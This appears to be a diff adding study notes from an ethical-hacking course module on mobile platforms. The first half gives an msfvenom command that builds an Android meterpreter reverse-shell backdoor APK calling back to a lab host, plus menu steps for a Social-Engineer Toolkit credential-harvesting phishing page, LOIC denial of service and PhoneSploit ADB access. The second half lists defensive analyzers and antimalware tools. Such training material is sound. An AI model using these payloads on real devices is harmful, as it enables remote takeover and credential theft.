@@ -1,0 +1,46 @@
+17-Hacking Mobile Platforms
+
+
+    Hack android devices
+        Hack an Android device by creating binary payloads using Parrot Security
+        	msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.10.13 R > Desktop/Backdoor.apk
+        	Creating a apk to get control of device
+
+        Harvest Users’ Credentials using the Social-Engineer Toolkit
+        	Type 1 and press Enter to choose Social-Engineering Attacks
+        	type 2 and press Enter to choose Website Attack Vectors.
+        	type 3 and press Enter to choose Credential Harvester Attack Method.
+
+        	Creating as a web phishing
+
+        Launch a DoS attack on a target machine using Low Orbital Cannon (LOIC) on the Android mobile platform
+        	Using this apk to attack one computer, especially with volunterr people
+
+        Exploit the Android platform through ADB using PhoneSploit
+        	The PhoneSploit main menu options appear, as shown in the screenshot.
+        	Type 3 and press Enter to select [3] Connect a new phone option.
+        	Complete as a meterpreter
+        	Ex
+        	Now, at the main_menu prompt, type 15 and press Enter to choose Run an app. In this example, we will launch a calculator app on the target Android device.
+        	To launch the calculator app, type com.android.calculator2 and press Enter.
+
+        	You can also use other Android hacking tools such as NetCut (http://www.arcai.com), drozer (https://labs.f-secure.com), zANTI (https://www.zimperium.com), Network Spoofer (https://www.digitalsquid.co.uk), and DroidSheep (https://droidsheep.info) to hack Android devices.
+
+
+    Secure Android Devices using Various Android Security Tools
+        Analyze a malicious app using online Android analyzers
+			SIXO online tool can analize apks
+
+        	You can also use other online Android analyzers such as SandDroid (http://sanddroid.xjtu.edu.cn), Apktool (http://www.javadecompilers.com), and Apprisk Scanner (https://apprisk.newskysecurity.com) to analyze malicious applications.
+
+        Analyze a malicious app using Quixxi vulnerability scanner
+        	Quixxi is an intelligent and integrated end-to-end mobile app security solution. This powerful tool is for developers to protect and monitor any mobile apps in minutes.
+
+        	You can also use other Android vulnerability scanners such as X-Ray (https://duo.com), Vulners Scanner (https://play.google.com), Shellshock Vulnerability Scan (https://play.google.com), Yaazhini (https://www.vegabird.com), and Quick Android Review Kit (QARK) (https://github.com) to analyze malicious apps for vulnerabilities.
+
+        Secure Android devices from malicious apps using Malwarebytes Security
+	        Malwarebytes is an antimalware mobile tool that provides protection against malware, ransomware, and other growing threats to Android devices. It blocks, detects, and removes adware and malware; conducts privacy audits for all apps; and ensures safer browsing.
+
+
+	         You can use other mobile antivirus and anti-spyware tools such as AntiSpy Mobile (https://antispymobile.com), Spyware Detector - Anti Spy Privacy Scanner (https://play.google.com), iAmNotified - Anti Spy System (https://iamnotified.com), and Privacy Scanner (AntiSpy) Free (https://play.google.com) to secure mobile devices from malicious apps.
+
